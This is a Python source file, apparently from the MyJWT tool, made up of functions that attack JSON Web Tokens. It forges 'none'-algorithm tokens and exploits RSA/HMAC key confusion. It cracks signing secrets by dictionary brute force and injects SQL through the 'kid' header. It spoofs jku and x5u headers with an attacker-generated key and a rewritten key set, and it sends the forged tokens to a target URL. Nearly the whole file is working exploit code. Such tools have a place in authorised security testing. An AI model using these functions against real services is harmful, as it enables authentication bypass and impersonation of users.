import base64
import json

import click
import requests

from OpenSSL import crypto

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

from MyJWT.Exception import InvalidJWT
from MyJWT.modifyJWT import changeAlg, signature
from MyJWT.utils import jwtToJson, encodeJwt, isValidJwt, HEADER, createCrt


def noneVulnerability(jwt):
    """
    Check none Vulnerability.

    :param str jwt: your jwt
    :return: new jwt
    :rtype: str

    :raise InvalidJWT: if your jwt is not valid
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = changeAlg(jwtToJson(jwt), "none")
    return encodeJwt(jwtJson) + "."


def confusionRsaHmac(jwt, filename):
    """
    Check rsa/hmac confusion.

    :param str jwt: your jwt
    :param str filename: path file
    :return: new jwt
    :rtype: str

    :raise InvalidJWT: if your jwt is not valid
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = changeAlg(jwtToJson(jwt), "HS256")
    return signature(jwtJson, open(filename).read())


def bruteforceDict(jwt, fileName):
    """
    Crack your jwt

    :param str jwt: your jwt
    :param str fileName: path file
    :return: key cracked or "" if key not found
    :rtype: str

    :raise InvalidJWT: if your jwt is not valid
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = jwtToJson(jwt)
    with open(fileName, "r", encoding="latin-1") as file:
        allPassword = [line.rstrip() for line in file]
    file.close()
    for password in allPassword:
        newJwt = signature(jwtJson, password)
        newSig = newJwt.split(".")[2]
        if newSig == jwt.split(".")[2]:
            return password
    return ""


def injectSqlKid(jwt, injection):
    """
    Inject sql to your jwt

    :param str jwt: your jwt
    :param str injection: your injection
    :return: new jwt
    :rtype: str

    :raise InvalidJWT: if your jwt is not valid
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = jwtToJson(jwt)
    jwtJson[HEADER]["kid"] = injection
    return signature(jwtJson, "")


def sendJwtToUrl(url, method, data, cookies, jwt):
    """
    Send requests to your url.

    :param str url: your url
    :param str method: method (GET, POST, etc.....)
    :param dict data: json to send
    :param dict cookies: cookies to send
    :param str jwt: your jwt
    :return: Response
    :rtype: requests.Response
    """
    if method == "POST":
        return requests.post(
            url, json=data, headers={"Authorization": "Bearer " + jwt}, cookies=cookies
        )

    return requests.request(method=method, url=url, json=data, cookies=cookies)


def printDecoded(jwt):
    """
    Print your jwt.

    :param str jwt: your jwt
    :return:
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = jwtToJson(jwt)
    click.echo("Header: " + json.dumps(jwtJson["header"]))
    click.echo("Payload: " + json.dumps(jwtJson["payload"]))
    click.echo("Signature: " + json.dumps(jwtJson["signature"]))


def jkuVulnerability(jwt=None, url=None, file=None, pem=None):
    """
    Check jku Vulnerability.

    :param str jwt: your jwt
    :param str url: url to get your jwk file
    :param str file:  your output json file name
    :param str pem: pem file name

    :return: New Jwt
    :rtype: str
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = jwtToJson(jwt)

    if "jku" not in jwtJson[HEADER]:
        raise InvalidJWT("Invalid JWT format JKU missing")

    if file is None:
        file = "jwk-python"
    jwks = requests.get(jwtJson[HEADER]["jku"]).json()

    jwtJson[HEADER]["alg"] = "RS256"
    jwtJson[HEADER]["jku"] = f"{url}/{file}.json"
    if pem is None:
        key = crypto.PKey()
        key.generate_key(type=crypto.TYPE_RSA, bits=2048)
    else:
        key = crypto.load_privatekey(crypto.FILETYPE_PEM, open(pem).read())
    priv = key.to_cryptography_key()
    pub = priv.public_key()

    e = pub.public_numbers().e
    n = pub.public_numbers().n

    jwks["keys"][0]["e"] = base64.urlsafe_b64encode(
        e.to_bytes(e.bit_length() // 8 + 1, byteorder='big')
    ).decode('UTF-8').rstrip('=')
    jwks["keys"][0]["n"] = base64.urlsafe_b64encode(
        n.to_bytes(n.bit_length() // 8 + 1, byteorder='big')
    ).decode('UTF-8').rstrip('=')

    f = open(f"{file}.json", "w")
    f.write(json.dumps(jwks))
    f.close()

    s = encodeJwt(jwtJson)

    sign = priv.sign(bytes(s, encoding='UTF-8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15())

    return s + '.' + base64.urlsafe_b64encode(sign).decode('UTF-8').rstrip('=')


def x5uVulnerability(jwt=None, crt=None, pem=None, url=None):
    """
    Check x5u Vulnerability.
    :param str jwt: your jwt
    :param str crt: crt path file
    :param str pem: pem path file
    :param str url: new x5u url
    :return: new jwt
    :rtype: str
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = jwtToJson(jwt)
    if "x5u" not in jwtJson[HEADER]:
        raise InvalidJWT("Invalid JWT format JKU missing")
    if crt is None or pem is None:
        crt, pem = createCrt()

    with open(crt, "r") as f:
        content = f.read()
        f.close()

    x5u = requests.get(jwtJson[HEADER]["x5u"]).json()
    x5u["keys"][0]["x5c"] = content\
        .replace("-----END CERTIFICATE-----", "") \
        .replace("-----BEGIN CERTIFICATE-----", "")\
        .replace("\n", "")

    jwtJson[HEADER]["x5u"] = url

    f = open("jwks_with_x5c.json", "w")
    f.write(json.dumps(x5u))
    f.close()

    s = encodeJwt(jwtJson)
    key = crypto.load_privatekey(crypto.FILETYPE_PEM, open(pem).read())

    priv = key.to_cryptography_key()
    sign = priv.sign(bytes(s, encoding='UTF-8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15())

    return s + '.' + base64.urlsafe_b64encode(sign).decode('UTF-8').rstrip('=')
